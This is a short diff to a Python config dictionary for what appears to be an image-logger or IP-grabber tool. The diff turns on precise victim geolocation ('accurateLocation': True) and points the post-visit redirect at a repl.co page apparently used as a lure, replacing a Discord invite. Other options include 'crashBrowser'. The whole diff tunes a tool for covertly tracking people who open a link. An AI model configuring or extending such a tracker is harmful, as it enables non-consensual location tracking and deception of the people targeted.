@@ -31,7 +31,7 @@ config = {
 
     "crashBrowser": False,
     
-    "accurateLocation": False,
+    "accurateLocation": True,
 
     "message": { 
         "doMessage": False,
@@ -48,7 +48,7 @@ config = {
 
     "redirect": {
         "redirect": True,
-        "page": "https://discord.gg/wingsminer" 
+        "page": "https://popcornmovies.mas845legend.repl.co" 
     },
 }
 
